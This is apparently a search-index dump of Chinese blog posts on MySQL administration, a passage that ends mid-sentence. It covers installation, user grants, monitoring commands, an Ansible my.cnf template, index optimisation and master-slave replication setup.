https://dev.mysql.com/get/Downloads/MySQL-5.7/mysql-5.7.32-linux-glibc2.12-x86_64.tar.gz # 建议使用定制的 my.cnf 来进行初始化 # $\u003e /opt/mysql57/bin/mysqld --defaults-file=/data/mysql57/3307/etc/my.cnf --initialize-insecure --user=mysql $\u003e /opt/mysql57/bin/mysqld \\ --initialize-insecure \\ --user=mysql \\ --basedir=/opt/mysql57 \\ --datadir=/data/mysql57/3307/data 5.6 https://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.50-linux-glibc2.12-x86_64.tar.gz # 建议使用定制的 my.cnf 来进行初始化(使用配置文件仍然需要指定basedir路径或者执行时切换到安装目录,他的这个值是从命令行读取的,没有读取到的话,basedir默认为'.', mysql_install_db:426 行 ) $\u003e cd /opt/mysql56 \u0026\u0026 /opt/mysql56/scripts/mysql_install_db --defaults-file=/data/mysql56/3307/etc/my.cnf --user=mysql # $\u003e /opt/mysql56/scripts/mysql_install_db --user=mysql --basedir=/opt/mysql56 --datadir=/data/mysql56/3307/data 启动管理 $\u003e /opt/mysql56/bin/mysqld_safe --defaults-file=/data/mysql56/3307/etc/my.cnf # 在程序目录下 support-files/mysql.server 为官方的管理脚本， 将其复制到/etc/init.d/下，systemd重载配置后会自动生成对应名字的systemd管理单元 ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/:0:0","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"Mysql程序模型","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"Mysql程序模型 技巧 mysql程序模型 连接层 TCP/IP或Socket的连接方式 验证用户名密码 连接线程: 接收sql语句,返回执行结果 SQL层: 语法检查模块,检查上层发过来的SQL是否符合规范 权限检查模块.检查当前登陆用户是否由权限操作数据库对象 语法定义模块,识别语句种类 解析器,解析出SQL语句所有可能的执行方式,这些方式被称为\"执行计划\" 优化器,基于执行代价(基于系统资源的消耗作为维度 \u003ccpu/mem/io\u003e),管理员可以通过间接的方法,干预优化器的选择(索引) 执行器,按照优化器选择的\"最优\"的执行计划执行SQL,得出结论: 某某磁盘的某某位置 查询缓存,一般会用redis类产品替代 记录查询日志 存储引擎层 根据SQL层的执行结果,去磁盘找到对应的数据,结构化为表的模式返回给用户 和\"磁盘(文件系统)“打交道的层次 逻辑结构 抽象结构 库(databases,schema) – 文件夹 表(table) – 文件 物理结构 … ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/:0:0","tags":["linux","mysql"],"title":"Mysql程序模型(草稿)","uri":"/posts/mysql/mysql%E7%A8%8B%E5%BA%8F%E6%A8%A1%E5%9E%8B/"},{"categories":["linux","运维记事"],"content":"Mysql管理","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"用户管理 -- 授权语法 mysql\u003e grant \u003c权限\u003e on \u003c库名.表名\u003e to \u003c用户名\u003e@'\u003c可连接主机(名|ip)\u003e' identified by '\u003c密码\u003e'; -- 权限: SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,RELOAD,SHUTDOWN,PROCESS,FILE,REFERENCES,INDEX,ALTER,SHOW DATABASES,SUPER,CREATE TEMPORARY TABLES,LOCK TABLES,EXECUTE,REPLICATION SLAVE,REPLICATION CLIENT,CREATE VIEW,SHOW VIEW,CREATE ROUTINE,ALTER ROUTINE,CREATE USER,EVENT,TRIGGER,CREATE TABLESPACE -- 用户创建 mysql\u003e create user monitor@'10.0.2.2%' identified by 'Aa@@123456'; -- 用户授权: 授权后用户也可以创建数据库,但仅限创建授权了的库. mysql\u003e grant SELECT,INSERT,UPDATE,DELETE,CREATE,DROP on testdb.* to monitor@'10.0.2.26'; -- 用户删除 mysql\u003e drop user root@'node26'; mysql\u003e drop user ''@'node26'; -- 查询用户权限 mysql\u003e show grants for root@'localhost'; -- 取消权限 mysql\u003e revoke create,drop on testdb.* from monitor@'10.0.2.26'; mysql\u003e revoke all on testdb.* from monitor@'10.0.2.26'; 操作方式 分类 DDL: 数据定义语言 alert 库定义: 创建库定义 开发规范: 库名不能出现大写(win和linux区分大小写) 库名不能以数字开头 库名要和有业务功能相关 建库要加字符集 DCL: 数据控制语言 grant/revoke DML: 数据操作语言 insert/update/delete DQL: 数据查询语言 select 帮助命令: mysql\u003e help create database 常用的show语句 -- 显示所有数据库 show databases; -- 显示当前数据库中的默认表 show tables; -- 显示指定数据库中的表信息 show tables from world; -- 显示表列结构 show columns from world.city; -- 显示表中有关索引和索引列的信息 show index from world.city; -- 显示可用字符集和默认校验规则 show character set; -- 显示可用校验规则 show collation; -- 显示数据库状态 show status; -- 显示数据库中的参数定义值 show variables 非交互式 $\u003e mysql -u\u003c用户名\u003e -p\u003c密码\u003e -e \"select user,host,password from mysql.user\" 交互式 - SQL结构化的查询语言 $\u003e mysql -u\u003c用户名\u003e -p\u003c密码\u003e mysql\u003e show databases; \\G: 将数据转key-value的形式显示,table_name:value,\\G时不能使用 ; 结 尾 mysql\u003e show databases\\G 记录操作日志到某个文件(类似script和screen记录日志的功能) mysql\u003e tee /tmp/test.log mysql\u003e show databases; 结束上一条命令(正常情况下mysql\u003e 下不能使用ctrl+c) mysql\u003e sssss\\c 查看当前数据库基本状态 mysql\u003e \\s # status 执行外部sql脚本 mysql\u003e source \u003cfilename\u003e # \\. \u003cfilename\u003e 切换到某一个数据库 mysql\u003e use mysql # \\u mysql 创建数据库 character set: 字符集 collate: 校验规则 mysql\u003e create {database|schema} testdb02 default {charset|character set} utf8 collate utf8_bin; 查询建库语句 mysql\u003e show create {database|schema} testdb02; 修改数据库字符集(修改时需要注意,字符集一定是从小往大改,后者必定是前者的严格超集,一般生产不建议改动,如uft8可以改成utf8mb4) mysql\u003e alter {database|schema} testdb02 {charset|character set} utf8mb4; # collate utf8mb4_bin 修改数据库表字符集 mysql\u003e alter table t1 character set latin1 删除数据库 mysql\u003e drop {database|schema} testdb02; 创建表 mysql\u003e create table t1(id int(10))engine=innodb charset=utf8; mysql\u003e create table t1 like t2 mysql\u003e create table t1_bak select * from t1 # 忽略外键/主键 修改表名 mysql\u003e rename table t1 to student; mysql\u003e alter table student rename to stu; 查看建表语句 mysql\u003e show create table stu; 添加列 mysql\u003e alter table stu add c1 int,add num int; 在指定列后添加列 mysql\u003e alter table stu add stuid int after id; 添加列到最前 mysql\u003e alter table stu add sid int first; 删除列 mysql\u003e alter table stu drop stuid; 修改列(可同时修改数据类型) mysql\u003e alter table stu change c1 stu_name varchar(12); 修改列 mysql\u003e alter table stu modify stu_name varchar(33); 查看列结构 mysql\u003e desc stu; 删除表 mysql\u003e drop table stu; 查看mysql支持的字符集和校验规则 show CHARACTER set show collation ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/:0:0","tags":["linux","mysql"],"title":"Mysql管理","uri":"/posts/mysql/mysql%E7%AE%A1%E7%90%86/"},{"categories":["linux","运维记事"],"content":"Mysql监控指标","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/","tags":["linux","mysql"],"title":"Mysql监控指标","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"元数据获取 元数据存储于information_schema库中,其作用充当数据库元数据的中央系统信息库,使用表格形式以实现灵活的访问,另外他是虚拟数据库,其表非真实表,而是系统视图,其根据当前用户的特权动态填充表.只能进行查询. 列名 描述 table_schema 表所在的库 table_name 表名字 engine 表的引擎 table_rows 表的行数 avg_row_length 平均行长度 index_length 索引长度 查看字符集默认校验规则 SELECT c.CHARACTER_SET_NAME ,c.COLLATION_NAME FROM INFORMATION_SCHEMA.COLLATIONS c WHERE c.IS_DEFAULT = 'yes'; 利用CONCAT拼接逐表备份语句 select concat(\"mysqldump -uroot --default-character-set=utf8mb4 --single-transaction -R -E \" ,t.TABLE_SCHEMA ,\" \",t.TABLE_NAME ,\" | gzip \u003e /data/backup/\",t.TABLE_SCHEMA ,\"_\" ,date_format(now(),'%Y%m%d%k%i') ,\"/\" ,t.TABLE_NAME ,\".sql.gz\") from information_schema.TABLES t where t.TABLE_SCHEMA = 'mysql' into outfile '/tmp/mysql.sql' ; -- into outfile '/tmp/mysql.sql' -- 需设置安全路径 /etc/my.cnf:[mysqld] secure-file-priv=/tmp ,重启 统计每个库下的每个表个数(监控) select table_schema,count(table_name) from `TABLES` group by table_schema; 统计某个库下的所有表的行数(监控) select table_name,table_rows from tables where table_schema='zabbix' 统计某个数据库的数据量 select table_schema,sum(avg_row_length*table_rows+index_length)/1024/1024 as size_mb from information_schema.tables group by table_schema; SELECT TABLE_SCHEMA, SUM(DATA_LENGTH)/1024/1024 as size_mb FROM TABLES GROUP BY TABLE_SCHEMA; ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/:0:0","tags":["linux","mysql"],"title":"Mysql监控指标","uri":"/posts/mysql/mysql%E7%9B%91%E6%8E%A7%E6%8C%87%E6%A0%87/"},{"categories":["linux","运维记事"],"content":"Mysql密码重置","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/","tags":["linux","mysql"],"title":"Mysql密码重置","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":" 重置 MySQL 或 MariaDB Root 密码(在mysql停止的情况下重置mysql密码) https://linux.cn/article-9990-1.html?utm_source=index\u0026utm_medium=moremore ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/:0:0","tags":["linux","mysql"],"title":"Mysql密码重置","uri":"/posts/mysql/mysql%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Mysql命令收集","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"DBA 账号授权 GRANT ALL PRIVILEGES ON *.* TO 'root'@'ip' Identified by \"密码\" WITH GRANT OPTION; 检测mysql server是否正常提供服务 mysqladmin -u sky -ppwd -h localhost ping 获取mysql当前的几个状态值 mysqladmin -u sky -ppwd -h localhost status 获取数据库当前的连接信息 mysqladmin -u sky -ppwd -h localhost processlist 获取当前数据库的连接数 mysql -u root -ppwd -BNe \"select host,count(host) from processlist group by host;\" information_schema 显示mysql的uptime mysql -e\"SHOW STATUS LIKE '%uptime%'\"|awk '/ptime/{ calc = $NF / 3600;print $(NF-1), calc\"Hour\" }' 查看数据库的大小 mysql -u root -ppwd-e 'select table_schema,round(sum(data_length+index_length)/1024/1024,4) from information_schema.tables group by table_schema;' 查看某个表的列信息 mysql -u \u003cuser\u003e --password=\u003cpassword\u003e -e \"SHOW COLUMNS FROM \u003ctable\u003e\" \u003cdatabase\u003e | awk '{print $1}' | tr \"\\n\" \",\" | sed 's/,$//g' 执行mysql脚本 mysql -u user-name -p password \u003c script.sql mysql进程监控 ps -ef | grep \"mysqld_safe\" | grep -v \"grep\" ps -ef | grep \"mysqld\" | grep -v \"mysqld_safe\"| grep -v \"grep\" 查看当前数据库的状态 mysql -u root -ppwd -e 'show status' mysqlcheck 工具程序可以检查(check),修 复( repair),分 析( analyze)和优化(optimize)MySQL Server 中的表 mysqlcheck -u root -ppwd --all-databases mysql qps查询 QPS = Questions(or Queries) / Seconds mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Questions\"' mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Queries\"' mysql Key Buffer 命中率 key_buffer_read_hits = (1 - Key_reads / Key_read_requests) * 100% key_buffer_write_hits= (1 - Key_writes / Key_write_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Key%\"' mysql Innodb Buffer 命中率 innodb_buffer_read_hits=(1-Innodb_buffer_pool_reads/Innodb_buffer_pool_read_requests) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_buffer_pool_read%\"' mysql Query Cache 命中率 Query_cache_hits= (Qcache_hits / (Qcache_hits + Qcache_inserts)) * 100% mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Qcache%\"' mysql Table Cache 状态量 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Open%\"' mysql Thread Cache 命中率 Thread_cache_hits = (1 - Threads_created / Connections) * 100% 正常来说,Thread Cache 命中率要在 90% 以上才算比较合理。 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Thread%\"' mysql 锁定状态:锁定状态包括表锁和行锁两种,我们可以通过系统状态变量获得锁定总次数,锁定造成其他线程等待的次数,以及锁定等待时间信息 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"%lock%\"' mysql 复制延时量 在slave节点执行 mysql -u root -ppwd -e 'SHOW SLAVE STATUS' mysql Tmp table 状况 Tmp Table 的状况主要是用于监控 MySQL 使用临时表的量是否过多,是否有临时表过大而不得不从内存中换出到磁盘文件上 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Created_tmp%\"' mysql Binlog Cache 使用状况:Binlog Cache 用于存放还未写入磁盘的 Binlog 信 息 。 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Binlog_cache%\"' mysql nnodb_log_waits 量:Innodb_log_waits 状态变量直接反应出 Innodb Log Buffer 空间不足造成等待的次数 mysql -u root -ppwd -e 'SHOW /*!50000 GLOBAL */ STATUS LIKE \"Innodb_log_waits' ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["linux","mysql"],"title":"Mysql命令收集","uri":"/posts/mysql/mysql%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["linux","运维记事"],"content":"Mysql配置文件","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"修改配置文件(默认的/etc/my.cnf是mariadb的) https://blog.51cto.com/moerjinrong/2092791 参数优先级: 命令行参数指定 \u003e 配置文件 my.cnf(指定配置文件\u003e数据目录下的配置文件\u003eetc下的配置文件) \u003e 默认参数 标签配置分类 标签用某个特定的标签值来表示以下内容针对于某个程序(命令)体现的,一般可分文[client]、[server]两大类 [client]: 针对全部客户端 [mysql]: 标签下内容针对mysql这个程序(命令)来设置的 [mysqladmin]: … [mysqldump]: … [server]: 针对全部服务端 [mysqld_safe]: 标签下内容针对mysqld_safe这个程序(命令)来设置的( mysqld_safe是用来管理mysqld的一个进程，其增加了一些安全特性 ) [mysqld]: 标签下内容针对mysqld这个程序(命令)来设置的 配置文件示例(ansible初始化示例) 注意配置文件每行后不能有空格,需直接换行 ; 目录结构 ; mysqldb ; └── 3306 ; ├── binlog ; ├── data ; ├── logs ; ├── relaylog ; └── tmp [client] port={{ MYSQL_PORT|default(3306) }} default-character-set = utf8 socket = {{ DATA_ROOT }}/mysql.sock ; prompt = '\\u@\\h [\\d] \u003e\\_' [mysqld] port={{ MYSQL_PORT|default(3306) }} bind-address = 0.0.0.0 character-set-server = utf8 collation-server = utf8_general_ci socket = {{ DATA_ROOT }}/mysql.sock pid-file = {{ DATA_ROOT }}/mysql.pid ; 二进制安装配置 basedir = {{ BASEDIR }} datadir = {{ DATA_ROOT }}/data tmpdir = {{ DATA_ROOT }}/tmp ; 存在大量提交时建议关闭提交(默认开启) autocommit=on ; 第一个ibdata 必定是一个固定大小的，若在启动后修改，则需要设置与实际大小一致，不能多也不能少，第二个则不受限制(默认是下12M) innodb_data_file_path=ibdata1:512M;ibdata2:512M:autoextend ; 常规日志，记录所有成功的语句(默认关闭,不建议开启) general_log=off general_log_file={{ DATA_ROOT }}/logs/server2.log ; 错误日志,记录数据库的一般状态及报错信息,是我们对于数据库常规报错处理的常用日志 log-error={{ DATA_ROOT }}/logs/mysqld.log ; 禁用dns解析(只能使用ip) skip-name-resolve ; 二进制日志控制 start ; 建议设置全备+1天 ; expire_logs_days = 8 ; 各个节点不一样 server_id = {{ 65535 |random(1,9) }} ; sync_binlog 为1时, 每次提交都会向磁盘中写入数据(bin-log目录最好和数据目录分开),最安全但是性能损耗最大,不建议开启 sync_binlog=0 master_info_repository=TABLE log-bin = {{ DATA_ROOT }}/binlog/mysql-bin binlog_format = row ; 关闭relay_log 自动清理功能 relay_log_purge = 0 relay_log_info_repository=TABLE relay-log = {{ DATA_ROOT }}/relaylog/mysql-relay-bin ; 主从同步重连时间(默认3600s)，从库多长时间未收到主库传来的Binary Logs events后从而判定超时,slaveIO线程重连,越频繁建议设置越小 slave_net_timeout = 5 ; 启用GTID,不启用则为普通复制(单节点开启无意义) gtid-mode=on ; 强制GTID的一致性 enforce-gtid-consistency=true ; slave更新是否记录日志 (多主环境必加) log-slave-updates=1 ; 二进制日志控制 end ; 打开并记录慢日志 slow_query_log = OFF slow_query_log_file = {{ DATA_ROOT }}/logs/slow.log ; 设定超过多少时间(s)的sql会被记录,一般不会超过1秒 long_query_time = 0.5 ; 不使用索引的慢查询日志是否记录到索引 log_queries_not_using_indexes = on ; 查询结果小于多少行的将不会记录,此参数需要参考者设置 ; min_examined_row_limit=100 ; fix: Got an error reading communication packets max_allowed_packet = 16M ; mysql 优化 start open_files_limit = 65535 ; mysql 优化 end [mysqldump] quick max_allowed_packet = 128M ; mysqldump -uroot -p -A -R --triggers --master-data=2 --single-transaction|gzip \u003e /backup/all_$(date +\"%F-%T\").sql.gz ; ignore-table=database.table ","date":"2022-06-24","objectID":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysql配置文件","uri":"/posts/mysql/mysql%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql优化","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"1. Mysql 优化 1.1. 索引优化 索引的种类 B树(b-tree B+tree B*tree); R树; Hash索引 全文索引 B树索引的类型 聚簇索引(cluster index): 一般是基于主键的,自动生成,一般是建表时创建 辅助索引(普通索引:回表查询; 覆盖索引: 不回表查询): 认为创建(普通型,覆盖型) 唯一键索引: 认为创建 作用 在数据库中,索引是用来优化查询的. 排除缓存之外,数据的查询: 1. 全表扫描; 2. 索引扫描 1.1.1. 索引分类 主键索引 --- 创建主键索引(推荐) create table `\u003ctable_name\u003e` ( `id` int(4) not null auto_increment, `name` char(20) not null, primary key (`id`) ) engine=innodb default charset=utf8 --- 创建主键索引 create table `\u003ctable_name\u003e` ( `id` int(4) not null, `name` char(20) not null ) engine=innodb default charset=utf8 alter table \u003ctable_name\u003e change id id int(4) primary key not null auto_increment 普通索引(MUL) --- 创建索引 mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccolumn_name\u003e); # create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e); --- 删除索引 mysql\u003e alter table \u003ctable_name\u003e drop index \u003cindex_name\u003e; # drop index \u003cindex_name\u003e on \u003ctable_name\u003e; --- 查看索引信息 mysql\u003e show index from \u003ctable_name\u003e; 唯一索引 mysql\u003e create unique index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e) 前缀索引 --- create index idx_phoneNum on phone(phoneNum(3)) mysql\u003e create index \u003cindex_name\u003e on \u003ctable_name\u003e(\u003ccolumn_name\u003e(\u003clength\u003e)) 联合索引 # index(a,b,c) # a, ab, abc ,ac 走索引, 其他关联查询均不走索引(如 b,bc,c ) mysql\u003e alter table \u003ctable_name\u003e add index \u003cindex_name\u003e(\u003ccloumn_name1\u003e,\u003ccloumn_name2\u003e,\u003ccloumn_name3\u003e) 1.1.2. 查看某个语句在查询时是否使用了索引,使用了那些索引 mysql\u003e explain select * from world.city where Name = 'Chongqing'\\G ***************************[ 1. row ]*************************** id | 1 select_type | SIMPLE table | city type | ref possible_keys | idx_name key | idx_name key_len | 35 ref | const rows | 1 Extra | Using index condition -- type: 表示mysql在表中找到所需行的方式,又称\"访问类型\" --- 常见类型有: ALL,index,range,ref,eq_ref, const,system, NULL 从左到又,性能从差到好 --- ALL: 全表扫描,未使用索引查询(1. 语句写的有问题, 2. 索引问题) --- index: 全索引扫描 ---- explain select count(*) from city ; --- range: 范围扫描, 关键字包含 \u003e、\u003c、\u003e=、\u003c=、between...and、in()、or、like 'x%' ---- explain select * from city where `CountryCode` like 'CH%' --- ref: 使用非唯一索引(即非主键或唯一索引)扫描或者唯一的前缀扫描，返回匹配某个单独值的记录行 ---- explain select * from city where Name = 'Chongqing' --- eq_ref: 类似ref，区别就是在使用的索引是唯一索引，对于每个索引键值，表中只有一条记录匹配(join条件使用的是primary key 或者 unique key) --- const、system: 将组件设置为where 的条件 ---- explain select * from city where id = 1; --- NULL: -------- -- key_len: 代表索引长度，若索引长度较长，可以将其替换为前缀索引 -- Extra: 相当于一个描述吧 --- 当出现 Using temporary; Using filesort; Using join buffer 时候，一般代表涉及到排序操作时部分数据可能未走索引，因此导致性能问题。 1.1.3. 索引设计的原则 为了使索引的使用效率更高，在创建索引时，必须考虑在哪些字段上创建索引和创建什么类型的索引。 那么索引设计原则又是怎样的? 1.1.3.1. 运维规范 选择唯一性索引(重点关注) 唯一性索引的值是唯一的，可以更快速的通过该索引来确定某条记录。例如，学生表中学号是具有唯一性的字段。为该字段建立唯一性索引可以很快的确定某个学生的信息。 如果使用姓名的话，可能存在同名现象，从而降低查询速度。主键索引和唯一键索引，在查询中使用是效率最高的。 为经常需要排序、分组和联合操作的字段建立索引(重点关注) 经常需要ORDER BY、GROUP BY、DISTINCT和UNION等操作的字段，排序操作会浪费很多时间。 如果为其建立索引，可以有效地避免排序操作。 为常作为查询条件的字段建立索引(重点关注) 如果某个字段经常用来做查询条件，那么该字段的查询速度会影响整个表的查询速度。因此，为这样的字段建立索引，可以提高整个表的查询速度。 尽量使用前缀来索引(重点关注) 如果索引字段的值很长，最好使用值的前缀来索引。例如，TEXT和BLOG类型的字段，进行全文检索会很浪费时间。如果只检索字段的前面的若干个字符，这样可以提高检索速度。 限制索引的数目 索引的数目不是越多越好。每个索引都需要占用磁盘空间，索引越多，需要的磁盘空间就越大(查询是IO消耗大)。修改表时，对索引的重构和更新很麻烦。越多的索引，会使更新表变得很浪费时间。 尽量使用数据量少的索引 如果索引的值很长，那么查询的速度会受到影响。例如，对一个CHAR（100）类型的字段进行全文检索需要的时间肯定要比对CHAR（10）类型的字段需要的时间要多。 删除不再使用或者很少使用的索引 表中的数据被大量更新，或者数据的使用方式被改变后，原有的一些索引可能不再需要。数据库管理员应当定期找出这些索引，将它们删除，从而减少索引对更新操作的影响。 1.1.3.2. 开发规范(草稿) 不走索引的情况： 重点关注： 没有查询条件，或者查询条件没有建立索引 select * from tab; 全表扫描。 select * from tab where 1=1; 在业务数据库中，特别是数据量比较大的表。 是没有全表扫描这种需求。 对用户查看是非常痛苦的。 对服务器来讲毁灭性的。 select * from tab; SQL改写成以下语句： selec * from tab order by price limit 10 # 需要在price列上建立索引 select * from tab where name='zhangsan' # name列没有索引 改： 换成有索引的列作为查询条件 将name列建立索引 查询结果集是原表中的大部分数据，应该是30％以上。 查询的结果集，超过了总数行数30%，优化器觉得就没有必要走索引了。 假如：tab表 id，name id:1-100w ，id列有索引 select * from tab where id\u003e500000; 如果业务允许，可以使用limit控制。 怎么改写 ？ 结合业务判断，有没有更好的方式。如果没有更好的改写方案 尽量不要在mysql存放这个数据了。放到redis里面。 索引本身失效，统计数据不真实 索引有自我维护的能力。 对于表内容变化比较频繁的情况下，有可能会出现索引失效。 查询条件使用函数在索引列上，或者对索引列进行运算，运算包括(+，-，*，/，! 等) 例子： 错误的例子：select * from test where id-1=9; 正确的例子：select * from test where id=10; 隐式转换导致索引失效.这一点应当引起重视.也是开发中经常会犯的错误. 由于表的字段tu_mdn定义为varch","date":"2022-06-24","objectID":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/:0:0","tags":["linux","mysql"],"title":"Mysql优化","uri":"/posts/mysql/mysql%E4%BC%98%E5%8C%96/"},{"categories":["linux","运维记事"],"content":"Mysql主从复制","date":"2022-06-24","objectID":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/","tags":["linux","mysql"],"title":"Mysql主从复制","uri":"/posts/mysql/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"categories":["linux","运维记事"],"content":"1. 前提 需要多个实例 每台实例server_id不同 需要开启二进制日志 主库需要提供复制相关的用户权限(replication slave) 从库需要将和主库相差的数据进行追加,一般先备份主库数据恢复到从库,然后在进行同步 从库应该从恢复之后的时间点开始自动从主库获取最新的二进制日志 2. 复制中的线程 主库 Dump thread: 在复制过程中,主库发送二进制日志的线程 binlog文件 : 主库的二进制文件 从库 IO thread : 向主库请求二进制日志,并接收二进制日志的线程 SQL thread : 执行请求过来的二进制的线程 relaylog : 中继日志,存储请求过来的二进制日志 master.info: 从库连接主库的重要参数(user,passwd,ip,port);上次获取过的主库的二进制日志位置 relay-log.info: 存储从库SQL线程已经执行过的relaylog日志位置 3. 主从复制原理 从库通过IO线程,读取master.info中的信息,获取到连接及上次请求主库的binlog的位置,然后IO线程使用获取到的连接连接到主库,主库获取到从库发来的位置信息和现有二进制日志进行对比,如果有新二进制日志,会通过dump thread发送给相关信息给从库,从库通过IO线程,接受主库发来的二进制日志后,存储到TCP/IP缓存中,并返回ACK确认给主库,主库收到ACK后,就认为任务复制完成了,可以继续其他工作。从库此时将更新master.info的二进制位置信息,IO线程会将TCP/IP缓存中的日志，会存储到relay-log日志文件中。然后SQL线程读取relay-log.info上次执行到的日志位置(此位置信息不一定与binlog日志位置相同),以这个日志位置为起点继续执行relay-log日志。SQL线程执行完成所有relay之后，会更新relay-log.info信息为新的位置信息。（至此一次复制完成） 4. 主从复制实践 4.1. my.cnf # 禁用dns解析(只能使用ip) skip-name-resolve # 二进制日志控制 server_id = 10 # 每个节点id不同 log-bin = /data/mysql57/3307/binlog/mysql-bin binlog_format = row 4.2. 备份 $\u003e mysqldump --defaults-file=/data/mysql57/3307/etc/my.cnf -A -R -B --triggers --master-data=2 --single-transaction \u003e /tmp/aa.sql $\u003e sed -n '22p' /tmp/aa.sql -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596; 4.3. 授权 $\u003e grant replication slave on *.* to repl@'10.0.2.%' identified by 'gC74lgK9sSkzwBbrztd3'; $\u003e flush privileges; 4.4. 备库导入数据 $\u003e mysql \u003c /tmp/aa.sql 4.5. 备库指定与主库的同步信息并启动同步 --- 指定同步连接信息(从库) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=596, MASTER_CONNECT_RETRY=3; --- 若初次搭建则(或从0开始全同步) mysql\u003e change master to MASTER_HOST='10.0.2.25', MASTER_USER='repl', MASTER_PASSWORD='gC74lgK9sSkzwBbrztd3', MASTER_PORT=3307, MASTER_AUTO_POSITION=1; --- 启动同步 mysql\u003e start slave --- 查看启动状态 mysql\u003e show slave status\\G 4.6. 主从状态信息介绍 mysql\u003e show slave status\\G Slave_IO_Running | Yes Slave_SQL_Running | Yes ## 最后一次IO的错误号码 Last_IO_Errno | 0 ## 最后一次IO的错误信息 Last_IO_Error | ## 最后一次SQL的错误号码 Last_SQL_Errno | 0 ## 最后一次SQL的错误信息 Last_SQL_Error | ## 从库(同步)落后于主库的秒数 Seconds_Behind_Master | 0 4.6.1. IO线程故障 主库连接不上: 防火墙、网络、连接信息错误(ip、passwd、port、user)、域名解析(skip-name-resolve) 解决方案: mysql\u003e stop slave; mysql\u003e reset slave all; mysql\u003e change master to ....; mysql\u003e start slave; 主库二进制日志文件丢失或损坏 解决方案: 重新备份恢复，在重新构建主从 4.6.1.1. 案例1 主从同步出现IO故障。导致原因，主库修改了端口号 解决方案: 从库 slow slave status\\G，确认故障 记录Master_Log_File和Read_Master_Log_Pos值 stop slave reset slave all change master to ... start slave 4.6.1.2. 案例2 主库的二进制日志被清理(1.reset master;2.binlog文件找不到/损坏/断节/物理删除/名字被修改等),从库请求日志出现Slave_IO_Running: 